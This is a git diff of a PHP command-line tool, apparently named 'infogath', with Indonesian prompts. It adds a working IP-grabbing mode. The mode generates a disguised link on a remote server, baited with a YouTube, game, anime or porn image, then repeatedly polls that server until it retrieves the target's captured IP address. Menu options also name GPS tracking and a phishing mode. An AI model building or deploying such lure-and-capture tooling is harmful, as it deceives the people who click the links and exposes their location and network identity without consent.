@@ -11,11 +11,11 @@
 /*
 	Configuration
 */
-$version 	= '1.0.1';
+$version 	= '1.0.2';
 $random 	= rand(123456789, 6);
-// $url 		= 'http://localhost/tools/';
 $file 		= 'infogath_update.php';
-$url 		= 'https://brad.josebernard.com/index/';
+$url 		= 'http://localhost/tools/';
+// $url 		= 'https://brad.josebernard.com/index/';
 
 error_reporting(0);
 
@@ -99,15 +99,9 @@ function buat_link($input, $random, $url, $id, $img)
 {	
 	$imgs = base64_encode($img);
 
-	if ($id == 1) {
-		$random2 = base64_encode($random);
-		$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
-		echo "\n\n[+] $url";
-		
-	}elseif($id == 'ip'){
-	}else{
-		
-	}
+	$random2 = base64_encode($random);
+	$url = 'Copy Link => '.$url.'home.php?redirect='.$input.'&page='.$random2.'&id='.$id.'&img='.$imgs;
+	echo "\n\n[+] $url";
 }
 
 function download($random, $url, $opt, $port)
@@ -206,9 +200,60 @@ if ($pilih == '--GPS' || $pilih == '--gps') {
 		echo "\n\n[-] PORT Harus Angka :'( \n\n";
 	}
 
-}elseif($pilih == '--IP'){
+}elseif($pilih == '--IP' || $pilih == '--ip'){
 
-	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
+	proses($random);
+	$input = trim(fgets(STDIN));
+
+	echo "\n(1) Youtube (2) PUBG (3) FreeFire (4) Anime (5) Bokep (6) Custom ? \n";
+	echo "[+] Use Image => : ";
+	$opsi_img = trim(fgets(STDIN));
+
+	switch ($opsi_img) {
+		case '1':
+			$img = 'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e1/Logo_of_YouTube_%282015-2017%29.svg/1280px-Logo_of_YouTube_%282015-2017%29.svg.png';
+			break;
+		case '2':
+			$img = 'https://res.cloudinary.com/teepublic/image/private/s---xiJeC7t--/t_Preview/b_rgb:191919,c_limit,f_jpg,h_630,q_90,w_630/v1535164327/production/designs/3064946_0.jpg';
+			break;
+		case '3':
+			$img = 'http://cm1.narvii.com/6653/1c97d673ada4bcca12be337f6909a801c282eaad_00.jpg';
+			break;
+		case '4':
+			$img = 'https://ih0.redbubble.net/image.397474907.7403/mp,550x550,matte,ffffff,t.3u1.jpg';
+			break;
+		case '5':
+			$img = 'https://chinadailymail.files.wordpress.com/2014/04/22-japanese-girl.jpg?w=640';
+			break;
+		case '6':
+			echo "[+] Image URL => : ";
+			$img = trim(fgets(STDIN));
+			break;
+		default:
+			exit();
+		break;
+	}
+
+	buat_link($input, $random, $url, 2, $img);
+
+	// litening
+	echo "\n\n[+] Listening Target < ";
+	$a = 1;
+	for ($a; $a < 9999; $a++) { 
+		
+		$cek = get_headers($url.'get/IP_GET'.$random.'.html');
+
+		// listen
+		if (!preg_match("/200/", $cek[0])) {
+			echo "=";
+		}else{
+			echo " >";
+			$file = file_get_contents($url.'get/IP_GET'.$random.'.html');
+			echo $file;
+			break;
+		}
+		sleep(3);
+	}
 
 }elseif($pilih == '--PHISING'){
 	echo "\n\n[-] Masih Di Bikin Bozzzz !!! \n\n";
